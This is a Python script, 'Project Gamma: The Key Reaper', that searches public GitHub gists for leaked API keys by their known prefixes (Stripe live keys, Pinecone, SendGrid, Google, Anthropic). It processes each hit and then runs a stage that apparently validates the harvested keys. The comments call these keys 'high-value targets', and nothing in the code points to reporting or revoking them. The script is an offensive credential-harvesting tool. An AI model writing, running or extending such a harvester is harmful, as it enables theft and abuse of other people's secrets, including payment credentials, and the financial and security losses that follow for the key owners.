import time
from scavenger import GitHubScavenger
from judge import KeyJudge

def reap():
    print("==========================================")
    print("   PROJECT GAMMA: THE KEY REAPER V1.1")
    print("==========================================")
    
    scavenger = GitHubScavenger()
    judge = KeyJudge()
    
    # Expanded queries for high-value targets
    queries = [
        "sk_live_",      # Stripe
        "pcsk_",         # Pinecone
        "SG.",           # SendGrid
        "AIzaSy",        # Google (More specific)
        "sk-ant-api03",  # Anthropic
    ]
    
    print("[Reaper] Commencing Discovery Stage...")
    for q in queries:
        gists = scavenger.search_gists(q)
        for gist in gists[:5]: # Throttle
            scavenger.process_gist(gist)
            time.sleep(2)
            
    print("\n[Reaper] Commencing Validation Stage...")
    judge.run_validation()
    
    print("\n[Reaper] Operation Complete.")

if __name__ == "__main__":
    reap()
